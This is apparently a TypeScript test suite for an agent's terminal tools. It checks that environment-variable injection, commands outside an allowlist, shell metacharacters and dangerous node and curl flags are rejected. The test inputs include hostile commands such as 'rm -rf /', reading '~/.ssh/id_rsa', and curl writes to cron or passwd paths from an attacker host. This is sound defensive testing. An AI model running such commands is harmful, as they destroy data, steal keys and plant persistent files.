import { describe, expect, it, vi } from "vitest";
import {
  createCreateTerminalTool,
  createRunInTerminalTool,
  createSendTerminalCommandTool,
} from "../terminal.js";

function mockExtensionClient(connected = true) {
  return {
    isConnected: () => connected,
    createTerminal: vi.fn().mockResolvedValue({ name: "test", index: 0 }),
    sendTerminalCommand: vi.fn().mockResolvedValue({ success: true }),
    listTerminals: vi.fn().mockResolvedValue([]),
    getTerminalOutput: vi.fn().mockResolvedValue(""),
  } as any;
}

function parseResult(result: any): string {
  return result.content?.at(0)?.text ?? "";
}

describe("createTerminal - dangerous env vars", () => {
  const workspace = "/tmp/test-workspace";

  it("blocks PATH in env", async () => {
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({ env: { PATH: "/evil" } })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("blocked");
  });

  it("blocks LD_PRELOAD (case-insensitive)", async () => {
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({
      env: { ld_preload: "/evil.so" },
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("blocked");
  });

  it("blocks NODE_OPTIONS", async () => {
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({
      env: { NODE_OPTIONS: "--inspect" },
    })) as any;
    expect(result.isError).toBe(true);
  });

  it("blocks PYTHONPATH", async () => {
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({
      env: { PYTHONPATH: "/evil" },
    })) as any;
    expect(result.isError).toBe(true);
  });

  it("blocks BASH_ENV", async () => {
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({
      env: { BASH_ENV: "/evil.sh" },
    })) as any;
    expect(result.isError).toBe(true);
  });

  it("allows safe env vars", async () => {
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({
      env: { MY_VAR: "hello", DEBUG: "true" },
    })) as any;
    expect(result.isError).toBeUndefined();
  });

  it("rejects env with more than 50 entries", async () => {
    const env: Record<string, string> = {};
    for (let i = 0; i < 51; i++) env[`VAR_${i}`] = "v";
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({ env })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("50");
  });

  it("rejects non-object env", async () => {
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({ env: "not-an-object" })) as any;
    expect(result.isError).toBe(true);
  });

  it("rejects non-string env values", async () => {
    const tool = createCreateTerminalTool(workspace, mockExtensionClient());
    const result = (await tool.handler({ env: { FOO: 123 } })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("string");
  });

  it("returns error when extension not connected", async () => {
    const tool = createCreateTerminalTool(
      workspace,
      mockExtensionClient(false),
    );
    const result = (await tool.handler({})) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("not connected");
  });
});

describe("sendTerminalCommand - allowlist", () => {
  it("blocks commands not in allowlist", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), [
      "npm",
      "node",
    ]);
    const result = (await tool.handler({
      text: "rm -rf /",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("not in the allowlist");
  });

  it("allows commands in the allowlist", async () => {
    const client = mockExtensionClient();
    const tool = createSendTerminalCommandTool(client, ["npm", "node"]);
    const result = (await tool.handler({
      text: "npm install",
      name: "test",
    })) as any;
    expect(result.isError).toBeUndefined();
    expect(client.sendTerminalCommand).toHaveBeenCalledWith(
      "npm install",
      "test",
      undefined,
      true,
    );
  });

  it("extracts first word correctly with leading spaces", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["npm"]);
    const result = (await tool.handler({
      text: "  npm install",
      name: "test",
    })) as any;
    expect(result.isError).toBeUndefined();
  });

  it("blocks when allowlist is empty", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), []);
    const result = (await tool.handler({
      text: "anything",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
  });

  it("requires name or index", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["echo"]);
    const result = (await tool.handler({ text: "echo hi" })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("name");
  });

  it("returns error when extension not connected", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(false), [
      "npm",
    ]);
    const result = (await tool.handler({
      text: "npm install",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("not connected");
  });
});

describe("sendTerminalCommand - metacharacter blocking", () => {
  it("blocks tilde home-dir expansion", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["cat"]);
    const result = (await tool.handler({
      text: "cat ~/.ssh/id_rsa",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("metacharacter");
  });

  it("blocks carriage return", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["echo"]);
    const result = (await tool.handler({
      text: "echo hi\r",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
  });

  it("blocks semicolon (existing)", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["echo"]);
    const result = (await tool.handler({
      text: "echo hi; rm -rf /",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("metacharacter");
  });

  it("blocks backtick subshell (existing)", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["echo"]);
    const result = (await tool.handler({
      text: "echo `id`",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("metacharacter");
  });

  it("blocks dollar-paren subshell (existing)", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["echo"]);
    const result = (await tool.handler({
      text: "echo $(id)",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("metacharacter");
  });
});

describe("sendTerminalCommand - PATH_FLAG_EXEMPTIONS", () => {
  it("blocks --config for npm (not exempt)", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["npm"]);
    const result = (await tool.handler({
      text: "npm --config=evil.js",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("not allowed");
  });

  it("allows --config for psql (exempt command)", async () => {
    const client = mockExtensionClient();
    const tool = createSendTerminalCommandTool(client, ["psql"]);
    const result = (await tool.handler({
      text: "psql --config=myservice",
      name: "test",
    })) as any;
    expect(result.isError).toBeUndefined();
  });

  it("allows --config for pg_dump (exempt command)", async () => {
    const client = mockExtensionClient();
    const tool = createSendTerminalCommandTool(client, ["pg_dump"]);
    const result = (await tool.handler({
      text: "pg_dump --config=myservice",
      name: "test",
    })) as any;
    expect(result.isError).toBeUndefined();
  });

  it("still blocks --prefix for psql (not in exemptions)", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["psql"]);
    const result = (await tool.handler({
      text: "psql --prefix=/evil",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("not allowed");
  });

  it("still blocks --config for pg_restore with equals form", async () => {
    // pg_restore IS exempt for --config, so this should pass
    const client = mockExtensionClient();
    const tool = createSendTerminalCommandTool(client, ["pg_restore"]);
    const result = (await tool.handler({
      text: "pg_restore --config=myservice",
      name: "test",
    })) as any;
    expect(result.isError).toBeUndefined();
  });
});

describe("sendTerminalCommand - curl output flags (audit 2026-06-03 HIGH #7)", () => {
  // runInTerminal must block the same output-redirect flags as runCommand.
  // Previously TERMINAL_DANGEROUS_PATH_FLAGS omitted curl's -o/--output/-O/etc,
  // so an allowlisted curl could write to arbitrary filesystem paths outside
  // the workspace — an escape that the stricter runCommand already blocked.
  const cases: Array<[string, string]> = [
    ["-o short output flag", "curl -o /etc/cron.d/evil https://attacker.test"],
    ["--output flag", "curl --output=/etc/passwd https://attacker.test"],
    ["-O remote-name flag", "curl -O https://attacker.test/evil"],
    ["-D dump-header flag", "curl -D /tmp/headers https://attacker.test"],
    ["-w write-out (per-command)", "curl -w /tmp/out https://attacker.test"],
  ];
  for (const [name, text] of cases) {
    it(`blocks curl ${name}`, async () => {
      const tool = createSendTerminalCommandTool(mockExtensionClient(), [
        "curl",
      ]);
      const result = (await tool.handler({ text, name: "test" })) as any;
      expect(result.isError).toBe(true);
      expect(parseResult(result)).toContain("not allowed");
    });
  }

  it("still allows a plain curl GET with no redirect flags", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["curl"]);
    const result = (await tool.handler({
      text: "curl -s https://example.test/api",
      name: "test",
    })) as any;
    expect(result.isError).toBeUndefined();
  });
});

describe("runInTerminal - metacharacter blocking", () => {
  function mockRunInTerminalClient(connected = true) {
    return {
      isConnected: () => connected,
      executeInTerminal: vi.fn().mockResolvedValue("output"),
    } as any;
  }

  it("blocks tilde home-dir expansion", async () => {
    const tool = createRunInTerminalTool("/tmp", mockRunInTerminalClient(), [
      "cat",
    ]);
    const result = (await tool.handler({
      command: "cat ~/.ssh/id_rsa",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("metacharacter");
  });

  it("blocks carriage return", async () => {
    const tool = createRunInTerminalTool("/tmp", mockRunInTerminalClient(), [
      "echo",
    ]);
    const result = (await tool.handler({ command: "echo hi\r" })) as any;
    expect(result.isError).toBe(true);
  });

  it("blocks Unicode line separator \\u2028", async () => {
    const tool = createRunInTerminalTool(mockRunInTerminalClient(), ["echo"]);
    const result = (await tool.handler({
      command: "echo hi\u2028malicious",
    })) as any;
    expect(result.isError).toBe(true);
    // \u2028 is in the non-ASCII whitespace set — caught by that check first
    expect(parseResult(result)).toContain("non-ASCII whitespace");
  });

  it("blocks Unicode paragraph separator \\u2029", async () => {
    const tool = createRunInTerminalTool(mockRunInTerminalClient(), ["echo"]);
    const result = (await tool.handler({
      command: "echo hi\u2029malicious",
    })) as any;
    expect(result.isError).toBe(true);
    // \u2029 is in the non-ASCII whitespace set — caught by that check first
    expect(parseResult(result)).toContain("non-ASCII whitespace");
  });

  it("blocks semicolon (existing)", async () => {
    const tool = createRunInTerminalTool(mockRunInTerminalClient(), ["echo"]);
    const result = (await tool.handler({
      command: "echo hi; rm -rf /",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("metacharacter");
  });
});

describe("runInTerminal - PATH_FLAG_EXEMPTIONS", () => {
  function mockClient(connected = true) {
    return {
      isConnected: () => connected,
      executeInTerminal: vi.fn().mockResolvedValue({ exitCode: 0, stdout: "" }),
    } as any;
  }

  it("blocks --config for npm via runInTerminal", async () => {
    const tool = createRunInTerminalTool("/tmp", mockClient(), ["npm"]);
    const result = (await tool.handler({
      command: "npm --config=evil.js",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("not allowed");
  });

  it("allows --config for psql via runInTerminal", async () => {
    const tool = createRunInTerminalTool("/tmp", mockClient(), ["psql"]);
    const result = (await tool.handler({
      command: "psql --config=myservice",
    })) as any;
    // Should not be an error from validation — may fail from execution
    // but that's OK, we're testing the flag exemption path
    expect(parseResult(result)).not.toContain("not allowed");
  });
});

describe("runInTerminal - shell integration unavailable falls back to subprocess", () => {
  // Bug: handleExecuteInTerminal (extension side) returns a non-null object
  // ({success:false, shellIntegrationUnavailable:true, error:"..."}) when
  // shell integration hasn't attached to the terminal yet (fresh terminal,
  // SSH remote, headless). The bridge's fallback comment says this case
  // should fall through to the subprocess path, but the old code only
  // fell through on a literal `null` result — so a `success:false` object
  // was returned to the caller as a tool "success" with the failure buried
  // in the payload, and the documented subprocess fallback never engaged.
  function mockClient(resolvedValue: unknown) {
    return {
      isConnected: () => true,
      executeInTerminal: vi.fn().mockResolvedValue(resolvedValue),
    } as any;
  }

  it("falls back to subprocess execution when shellIntegrationUnavailable is set", async () => {
    const tool = createRunInTerminalTool(
      // The subprocess fallback actually spawns a real process with this as
      // its cwd — unlike the other tests in this file, which mock
      // executeInTerminal directly and never touch the filesystem, "/tmp"
      // here would ENOENT on Windows (no such directory) and the subprocess
      // would fail to start, with execSafe swallowing the error into an
      // empty-output result. Use process.cwd(), guaranteed to exist.
      process.cwd(),
      mockClient({
        success: false,
        shellIntegrationUnavailable: true,
        error: "Shell Integration not available for this terminal.",
      }),
      ["git"],
    );
    // `git` is a real standalone binary on both POSIX and Windows (unlike
    // `echo`, which is a cmd.exe builtin with no echo.exe on Windows — the
    // subprocess fallback spawns the binary directly, not through a shell).
    const result = (await tool.handler({ command: "git --version" })) as any;
    expect(result.isError).toBeUndefined();
    const parsed = JSON.parse(parseResult(result));
    expect(parsed.fallback).toBe("subprocess");
    expect(parsed.stdout).toContain("git version");
  });

  it("does NOT fall back for other success:false reasons (e.g. terminal not found)", async () => {
    const tool = createRunInTerminalTool(
      "/tmp",
      mockClient({
        success: false,
        error: 'Terminal not found with name "bogus"',
      }),
      ["echo"],
    );
    const result = (await tool.handler({
      command: "echo hi",
      name: "bogus",
    })) as any;
    // Must surface the extension's actual error, not silently retry as a
    // subprocess ignoring the user's explicit terminal selection.
    const parsed = JSON.parse(parseResult(result));
    expect(parsed.fallback).toBeUndefined();
    expect(parseResult(result)).toContain("Terminal not found");
  });
});

describe("sendTerminalCommand - short-flag concat bypass (audit 2026-06-03 MEDIUM #15)", () => {
  // `node -revil.js` tokenises to ["-revil.js"]. The old flag-extraction did
  // `tok.split("=")[0]` which returns the whole token unchanged (no "=" present),
  // so "-r" was never found in DANGEROUS_FLAGS_FOR_COMMAND["node"].
  // Fix: for short flags (single leading "-"), take only the first 2 chars.

  it("blocks node -r with a concatenated value (e.g. node -revil.js)", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["node"]);
    const result = (await tool.handler({
      text: "node -revil.js",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
    expect(parseResult(result)).toContain("-r");
  });

  it("blocks node -e with a concatenated expression", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["node"]);
    const result = (await tool.handler({
      text: "node -eprocess.exit(0)",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
  });

  it("still blocks node -r as a standalone flag", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["node"]);
    const result = (await tool.handler({
      text: "node -r ./evil.js",
      name: "test",
    })) as any;
    expect(result.isError).toBe(true);
  });

  it("still allows a safe node invocation with no blocked flags", async () => {
    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["node"]);
    const result = (await tool.handler({
      text: "node --version",
      name: "test",
    })) as any;
    expect(result.isError).toBeUndefined();
  });
});
